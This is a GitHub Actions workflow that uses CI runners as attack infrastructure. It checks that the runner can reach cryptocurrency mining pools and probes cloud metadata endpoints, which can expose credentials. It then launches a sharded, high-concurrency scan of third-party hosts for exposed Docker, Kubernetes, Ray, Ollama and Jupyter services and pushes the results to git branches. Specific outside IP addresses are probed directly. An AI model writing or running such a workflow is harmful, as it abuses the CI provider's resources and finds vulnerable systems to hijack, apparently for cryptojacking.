name: vantage-scan
on:
  workflow_dispatch:
    inputs:
      shards:
        description: "number of shards"
        default: "8"
      conc:
        description: "concurrency per shard"
        default: "220"
      ports:
        description: "port list"
        default: "22,2375,2376,6443,10250,10255,9400,8265,8888,8188,8000,8001,8002,11434,4646,6817,5000,3000,9090,8080,80,443"
      max_hosts:
        description: "max hosts per shard (0=all)"
        default: "0"
permissions:
  contents: write
jobs:
  pool:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - name: egress+pool+imds
        run: |
          set +e
          echo "=== EGRESS IP ==="
          curl -s -m 10 https://api.ipify.org; echo
          curl -s -m 10 https://ipinfo.io/json | head -c 400; echo
          echo "=== POOLS ==="
          python3 - <<'PY'
          import socket, time
          ep = [("prl-sg.kryptex.network",7048),("prl-sg.kryptex.network",8048),
                ("prl-eu.kryptex.network",7048),("prl-eu.kryptex.network",8048),
                ("prl-us.kryptex.network",7048),("prl-us.kryptex.network",8048),
                ("pearlhash.xyz",9000),("pearlhash.xyz",9443),
                ("pool.pearlhash.xyz",9000),("pool.pearlhash.xyz",9443),
                ("pearl.luckypool.io",443),("pearl.luckypool.io",3360)]
          for h,p in ep:
              t=time.time()
              try:
                  s=socket.create_connection((h,p),6); s.settimeout(4)
                  try:
                      d=s.recv(200)
                  except Exception: d=b""
                  print(f"POOL {h}:{p} OPEN {int((time.time()-t)*1000)}ms banner={d[:80]!r}")
                  s.close()
              except Exception as e:
                  print(f"POOL {h}:{p} FAIL {type(e).__name__} {int((time.time()-t)*1000)}ms")
          PY
          echo "=== IMDS FROM RUNNER ==="
          for U in http://169.254.169.254/latest/meta-data/ http://169.254.169.254/metadata/v1.json http://metadata.google.internal/computeMetadata/v1/ http://100.100.100.200/latest/meta-data/; do
            echo "-- $U"; curl -s -m 4 -H "Metadata-Flavor: Google" -H "Metadata:true" "$U" | head -c 200; echo
          done
          echo "=== KNOWN-FROM-VPS-RST TARGETS ==="
          python3 - <<'PY'
          import socket, time
          for ip,ps in [("102.164.62.52",[10250,6443]),("102.164.62.137",[2375,9400,8888]),("102.164.62.1",[22,443])]:
              for p in ps:
                  t=time.time()
                  try:
                      s=socket.create_connection((ip,p),6); print(f"CHK {ip}:{p} OPEN {int((time.time()-t)*1000)}ms"); s.close()
                  except Exception as e: print(f"CHK {ip}:{p} FAIL {type(e).__name__} {int((time.time()-t)*1000)}ms")
          PY
  scan:
    needs: pool
    runs-on: ubuntu-latest
    timeout-minutes: 150
    strategy:
      fail-fast: false
      max-parallel: 8
      matrix:
        shard: [0,1,2,3,4,5,6,7]
    steps:
      - uses: actions/checkout@v4
      - name: scan
        env:
          SHARD: ${{ matrix.shard }}
          SHARDS: ${{ inputs.shards }}
          CONC: ${{ inputs.conc }}
          PORTS: ${{ inputs.ports }}
          MAX_HOSTS: ${{ inputs.max_hosts }}
          OUT: vantage/out/shard${{ matrix.shard }}.jsonl
        run: |
          python3 -u vantage/scan.py
          wc -l vantage/out/*.jsonl
          head -c 4000 vantage/out/shard${{ matrix.shard }}.jsonl
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: vscan-${{ matrix.shard }}
          path: vantage/out/
      - name: publish
        if: always()
        run: |
          set +e
          git config user.email bot@ul.local; git config user.name ul
          git checkout -b vres/${{ github.run_id }}-${{ matrix.shard }}
          git add -f vantage/out/
          git commit -m "vscan ${{ matrix.shard }}"
          git push -q origin HEAD:vres/${{ github.run_id }}-${{ matrix.shard }}
